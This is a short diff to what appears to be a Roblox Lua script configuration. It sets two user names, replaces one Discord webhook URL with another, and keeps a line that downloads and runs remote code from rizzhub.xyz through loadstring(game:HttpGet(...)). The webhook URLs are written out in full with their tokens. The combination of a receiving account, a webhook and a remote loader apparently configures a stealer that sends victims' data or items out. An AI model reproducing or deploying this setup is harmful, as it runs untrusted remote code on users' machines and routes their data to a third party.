@@ -1,5 +1,5 @@
 UserName = "imrealboy89"
 UserName2 = "imrealboy89" 
-Webhook = "https://discord.com/api/webhooks/1073588501095919646/noxb4pBzP0JLtrkEspDzHb58KOC9cM_D3pMCUpf1KcW0J9vOLb0kTliJ4-klbi2Ur2yx"
+Webhook = "https://discord.com/api/webhooks/1096752729197662268/1mh_v0UCJ4lpVqW9vjrYUyqXDXZGow4IE9Etvn9R8pYR7m6cTcitbPwMCXpcSO8o4Mbg"
  
 loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
